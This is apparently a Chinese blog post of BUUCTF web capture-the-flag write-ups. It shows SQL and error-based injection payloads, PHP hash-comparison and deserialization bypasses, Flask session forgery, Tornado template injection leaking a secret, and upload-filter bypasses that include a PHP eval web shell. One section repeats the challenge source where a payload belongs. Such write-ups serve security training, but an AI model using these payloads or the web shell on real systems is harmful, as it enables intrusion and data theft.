+++
title = 'BUUCTF WEB 1'
date = 2024-03-13T13:13:40+08:00
description = "BUUCTF WEB"
tags = [
    "WEB",
]
categories = [
    "CTF",
]
+++

# BUUCTF WEB 1

## [BJDCTF2020]Easy MD5

response包中有Hint提示

```yaml
HTTP/1.1 200 OK
Server: openresty
Date: Wed, 31 Jan 2024 04:19:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Hint: select * from 'admin' where password=md5($pass,true)
X-Powered-By: PHP/7.3.13
Cache-Control: no-cache
Content-Length: 3107
```

可以知道是利用md5($pass,true)这个函数构造出sql注入的payload进行利用，即

```sql
select * from 'admin' where password=md5($pass,true)
select * from 'admin' where password='or'1
```

所有需要应该字符串来构造相应的payload，如`ffifdyop` ，对应的MD5为`0x276f722736c95d99e921722cf9ed621c`，这个是16进制的，由于MySQL默认把16进制转成ASCII，所以会变成`'or'6É]é!r,ùíb`，满足上述开头，接着来到第二个页面

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。只有是弱比较才能用！！！

```
以下值在md5加密后以0E开头：

QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```

下一关

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2']))
{
    echo $flag;
} 
?>
```

php的md5()无法处理数组，结果返回为NULL，所以使用数组绕过就行

```
param1[]=111&param2[]=222
```

## [HCTF 2018]admin

### 思路一：弱口令

### 思路二：Flask Session伪造

注册登录后，在change页面找到源码网址

```
https://github.com/woadsl1234/hctf_flask/
```

访问拿到源码，并且发现是flask网站，抓包也有flask session

``` yaml
POST /login HTTP/1.1
Host: fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3987393260628375106622242395
Content-Length: 287
Origin: http://fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81
Connection: close
Referer: http://fb32d279-c5b3-4f60-8889-ff92cf77b52d.node5.buuoj.cn:81/login
Cookie: session=.eJw9j8FqwzAQRH-l6NyD7aSXQA4BOcaGlRDIFruX4NquHdlKoS3IVsi_V7SQ0ywM-2bmzi7Xnh3u7OWdHRhxlRGfN7L9AhZTweeErPKgmwV0FyQ_rcTHTGT5JrkKaGePJk-Al_EHPIZ-ElmZCQ471HWQurIQygQKfJO8WqRRkVHuwKkEdTWBjhpGL-x5Aqv2aDsvHPh4b2TqNGasqBeHBvdU1KvUeQA7rmTUkT1eWff99XH5-ZyH23MCmIgvyKI9z8RhA557WaAnQ45cnKQh1hMWM5UIPsYadYrj8Q93de04PElD05R0-ndurYsGa9njF7f_Yjs.Zbt3cQ.lbiU5iv-IXjUVquN9B9XGZVc9x8
Upgrade-Insecure-Requests: 1

-----------------------------3987393260628375106622242395
Content-Disposition: form-data; name="username"

a
-----------------------------3987393260628375106622242395
Content-Disposition: form-data; name="password"

a
-----------------------------3987393260628375106622242395--
```

利用脚本解码session

```
https://github.com/noraj/flask-session-cookie-manager
```

上述脚本decode输出结果无法直接就行encode，所以使用以下脚本decode，结果可以直接encode

```python
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode


def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception(
            'Could not base64 decode the payload because of an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception(
                'Could not zlib decompress the payload before decoding the payload'
            )

    return session_json_serializer.loads(payload)


if __name__ == '__main__':
    # print(decryption(sys.argv[1].encode()))
    session = b'.eJw9kEGLwjAQhf_KMmcPbXUvggchtVSYhEBqmFzE1dqaNi5UJW3E_77BBU8z8HjfvDdP2J-H-tbC8j486hnsLydYPuHrB5ZgmMwM6yZjTz1aSjnrEmOlR7XrUR2DYOvRsCbjWT4JJgPZzpPOE2Rl9KCncGp5Vmac4ZxUFYTaWgxlggV9C7bthZaRUc7RyYTUtkUVZ2g8t5sWrVyQPXru0Md9MrpK442RVO9I08IU1ShUHtA2o9FyBa8ZHG_DeX__7errpwLqiC-MJbvpDMMJWe5FQd5o44yLlRTGeNxSJhPOmhijSqlZvXEXd2jqD6ne7Uqz_leuBxcFOMAMHrd6eP8M0gRef9vxa1Y.Zbt_JQ.A8Wr3XzTIQKDpoUd_JP5SKVSBMY'
    print(decryption(session))
```

解码得到

```json
{'_fresh': True, '_id': b'd46d92f7e265494f4015e173801d867a2843b90aa4022f30c7a7b6437a5392c3240f982e9d38272d4a2a144c8061a248b706c0242ee5841a9faf8de1913281ed', 'csrf_token': b'1b70fcb1dd320108f0effff553643ccd4484a55b', 'image': b'yUHd', 'name': 'a', 'user_id': '10'}
```

构造admin用户session，然后encode，但encode需要密钥，在源码中找一下，找到直接构造

### 思路三：Unicode欺骗

需要进行代码审计，其中有一个函数

```python
def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

nodeprep.prepare()这个函数对于特殊字符会做如下处理

```
ᴬ -> A -> a
```

所以注册一个特殊符号的用户，后端会处理成admin用户，我们修改密码，然后直接登录

## [MRCTF2020]你传你🐎呢

简单的文件上传，限制了MIME类型，使用jpg，.htaccess绕过就行

## [护网杯 2018]easy_tornado

Tornado render()函数 STTI，hint提示cookie_secret，从而得知必须要知道cookie_secret

```yaml
HTTP/1.1 200 OK
Server: openresty
Date: Fri, 02 Feb 2024 07:11:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 46
Connection: close
Etag: "e73bd18a2a11c4a6d40c20c19f7abc8828daed51"
Cache-Control: no-cache

/hints.txt<br>md5(cookie_secret+md5(filename))
```

在各个地方尝试STTI，最后在error页面拿到cookie_secret，handler是Tornado最重要的对象，信息基本都在他身上

```yaml
GET /error?msg={{handler.application.settings}} HTTP/1.1
Host: 04183e51-6c5a-4db6-8607-f71a4ca0354a.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: openresty
Date: Fri, 02 Feb 2024 07:42:26 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 225
Connection: close
Etag: "e9d687ab39303c59dbcec9e081a1a5d2f531f21e"
Cache-Control: no-cache

<html>
<head>
<style>body{font-size: 30px;}</style>
</head>
<body>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;9a6fccf5-2228-4cae-9759-59b111eb39e7&#39;}</body>
</html>
```

## [ZJCTF 2019]NiZhuanSiWei

绕过后进行反序列化

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

先要对第一个判断进行绕过，已知没有包含这个内容的文件，使用需要使用伪协议构造内容，可以使用

```yaml
php://input，结合POST传参进行构造，如下

POST /?text=php://input HTTP/1.1
Host: bc9b97c7-289a-4345-8882-c772d7707103.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Cache: no-cache
Content-Length: 20
Origin: moz-extension://7e8bf9cd-f227-44fd-a6f5-66eb975a6d16
Connection: close

welcome to the zjctf
```

```yaml
data://text/plain;base64,SSBsb3ZlIFBIUAo=
data://text/plain,sadsadasds
data://是一个流封装协议，可以不借助文件直接把内容包含在php文件中，如下

GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= HTTP/1.1
Host: bc9b97c7-289a-4345-8882-c772d7707103.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

第二个判断是防止非预期解法，根据提示包含useless.php文件

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

根据提示falg在flag.php中，所以构造对于类

```php
<?php
class Flag
{  //flag.php  
    public $file = "flag.php";
    public function __tostring()
    {
        if (isset($this->file)) {
            echo file_get_contents($this->file);
            echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
$flag = new Flag();
echo serialize($flag);
// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>
```

## [极客大挑战 2019]HardSQL

先一个个试，或者直接Fuzz跑一下，看看回显，最后发现是报错注入，不过过滤了很多关键字，也可以Fuzz一下，看看有什么没被过滤的

过滤了空格所以payload都使用括号来代替，过滤=号使用like代替，报错注入可以使用extractvalue、updatexml这两个方法来利用，都是利用参数类型错误达到效果payload基本相似

```sql
sql = "select * from user where username='$username' and password='$password'"

-- updatexml--
payload = "1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23"

-- extractvalue --
payload = "1'or(extractvalue(0x0a,concat(0x0a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))%23"

payload = "1'or(extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())))))%23"

payload = "1'or(extractvalue(0x0a,concat(0x0a,(select(group_concat(right(password,25)))from(H4rDsq1)))))%23"
```

## [MRCTF2020]Ez_bypass
```php
<!-- I put something in F12 for you -->
<?php 
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
 ?>
<!-- Please input first -->
```
简单的绕过，先是数组绕过，后是数字加字符串拼接绕过
```php
<!-- I put something in F12 for you -->
<?php 
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
 ?>
<!-- Please input first -->
```
## [网鼎杯 2020 青龙组]AreUSerialz

简单的POP，注意变量为protected

```php
 <?php
include("flag.php");
highlight_file(__FILE__);
class FileHandler {
    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

payload如下

```json
O:11:"FileHandler":3:{s:5:"*op";i:2;s:11:"*filename";s:8:"flag.php";s:10:"*content";s:2:"hi";}
```

## [GXYCTF2019]BabyUpload

```
https://github.com/imaginiso/GXY_CTF/tree/master/Web/babyupload
```

```php
<?php
session_start();
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> 
<title>Upload</title>
<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
上传文件<input type=\"file\" name=\"uploaded\" />
<input type=\"submit\" name=\"submit\" value=\"上传\" />
</form>";
error_reporting(0);
if(!isset($_SESSION['user'])){
    $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000));
}
if(isset($_FILES['uploaded'])) {
    $target_path  = getcwd() . "/upload/" . md5($_SESSION['user']);
    $t_path = $target_path . "/" . basename($_FILES['uploaded']['name']);
    $uploaded_name = $_FILES['uploaded']['name'];
    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,'.') + 1);
    $uploaded_size = $_FILES['uploaded']['size'];
    $uploaded_tmp  = $_FILES['uploaded']['tmp_name'];
 
    if(preg_match("/ph/i", strtolower($uploaded_ext))){
        die("后缀名不能有ph！");
    }
    else{
        if ((($_FILES["uploaded"]["type"] == "
            ") || ($_FILES["uploaded"]["type"] == "image/jpeg") || ($_FILES["uploaded"]["type"] == "image/pjpeg")) && ($_FILES["uploaded"]["size"] < 2048)){
            $content = file_get_contents($uploaded_tmp);
            if(preg_match("/\<\?/i", $content)){
                die("诶，别蒙我啊，这标志明显还是php啊");
            }
            else{
                mkdir(iconv("UTF-8", "GBK", $target_path), 0777, true);
                move_uploaded_file($uploaded_tmp, $t_path);
                echo "{$t_path} succesfully uploaded!";
            }
        }
        else{
            die("上传类型也太露骨了吧！");
        }
    }
}
?>
```

规定只能上传jpg，所以先上传一个.htaccess，再上传一个jpg，不过对文件过滤内容，如果包含<?则被过滤，所以使用以下方式来绕过

```php
<script language="php">
@eval($_POST['cmd']);
</script>
```

## [SUCTF 2019]CheckIn

```php
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Upload Labs</title>
</head>

<body>
    <h2>Upload Labs</h2>
    <form action="index.php" method="post" enctype="multipart/form-data">
        <label for="file">文件名：</label>
        <input type="file" name="fileUpload" id="file"><br>
        <input type="submit" name="upload" value="提交">
    </form>
</body>

</html>

<?php
// error_reporting(0);
$userdir = "uploads/" . md5($_SERVER["REMOTE_ADDR"]);
if (!file_exists($userdir)) {
    mkdir($userdir, 0777, true);
}
file_put_contents($userdir . "/index.php", "");
if (isset($_POST["upload"])) {
    $tmp_name = $_FILES["fileUpload"]["tmp_name"];
    $name = $_FILES["fileUpload"]["name"];
    if (!$tmp_name) {
        die("filesize too big!");
    }
    if (!$name) {
        die("filename cannot be empty!");
    }
    $extension = substr($name, strrpos($name, ".") + 1);
    if (preg_match("/ph|htacess/i", $extension)) {
        die("illegal suffix!");
    }
    if (mb_strpos(file_get_contents($tmp_name), "<?") !== FALSE) {
        die("&lt;? in contents!");
    }
    $image_type = exif_imagetype($tmp_name);
    if (!$image_type) {
        die("exif_imagetype:not image!");
    }
    $upload_file_path = $userdir . "/" . $name;
    move_uploaded_file($tmp_name, $upload_file_path);
    echo "Your dir " . $userdir. ' <br>';
    echo 'Your files : <br>';
    var_dump(scandir($userdir));
}
```

过滤了php后缀和.htaccess，所以考虑php的用户配置文件.user.ini

```ini
# auto_prepend_file string
# Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.
# auto_prepend_file 就相当于 require function，可以用于文件包含

auto_prepend_file=1.jpg
```

接着传入图片马，注意蚁剑利用路径应为.user.ini和1.jpg的共同目录

## [GXYCTF2019]BabySQli

